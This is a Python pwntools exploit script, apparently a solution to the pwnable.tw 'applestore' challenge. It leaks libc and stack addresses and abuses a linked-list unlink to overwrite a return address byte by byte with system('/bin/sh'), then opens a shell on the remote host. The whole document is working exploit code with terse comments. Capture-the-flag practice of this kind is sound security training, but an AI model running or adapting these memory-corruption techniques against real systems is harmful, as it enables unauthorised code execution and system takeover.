
import time
from pwn import *

#r = process("./A", env={"LD_PRELOAD" : "./libc_32.so.6"})
r = remote('chall.pwnable.tw',10104)
# struct cart{
#     string* name
#     uint32_t price 
#     uint32_t *next_cart = 0
#     uint32_t *prev_cart = 0
# }

### vuln : different handle of input : read() and atoi()

### make total = 7174
for i in range(20):
    r.sendafter(b'>',b'2')
    r.sendafter(b'>',b'2')

for i in range(6):
    r.sendafter(b'>',b'2')
    r.sendafter(b'>',b'1')

r.sendafter(b'>',b'5')
r.sendafter(b'> ',b'y')


## leak libc using got table
got = 0x0804b034
r.send(b'4') # option 4
r.sendafter(b'> ',b'y\x00' + p32(got) + b'\x00' * 0xc)
r.recvuntil(b'27: ')
libc_base = u32(r.recv(4)) - 0x18540
success(f'LIBC : {hex(libc_base)}')

### leak stack addr

environ = 0x1b1dbc
r.send(b'4')
r.sendafter(b'> ',b'y\x00' + p32(libc_base + environ) + b'\x00' * 0xc)

r.recvuntil(b'27: ')
stack = u32(r.recv(4))
success(f'STACK : {hex(stack-0xa0)}')


###  
ret_addr = stack - 0xa0
system_offset = libc_base + 0x3a940
bin_sh = libc_base + 0x158e8b
write_addr = 0x804b100

### use unlink to overwrite return address
### because pre_chunk and next_chunk pointer need to be writable address
### so we can't inject libc address at one time 
### inject one byte every time

def arbitrary_write(addr, value):
    global write_addr
    mask = 0xff
    shift_offset = 0
    offset = 8

    for i in range(4):
        time.sleep(0.3)
        b = (value & mask) >> shift_offset
        #print(hex(b))
        r.send(b'3')
        r.sendafter(b'> ',b'27' + p32(libc_base + environ) + b'\x00' * 4  + p32(write_addr + b) + p32(addr - offset))
        mask = mask << 8
        shift_offset += 8
        offset -= 1

arbitrary_write(ret_addr, system_offset)
arbitrary_write(ret_addr + 4, bin_sh)
arbitrary_write(ret_addr + 8, bin_sh)
time.sleep(0.3)
r.send(b'6')
r.interactive()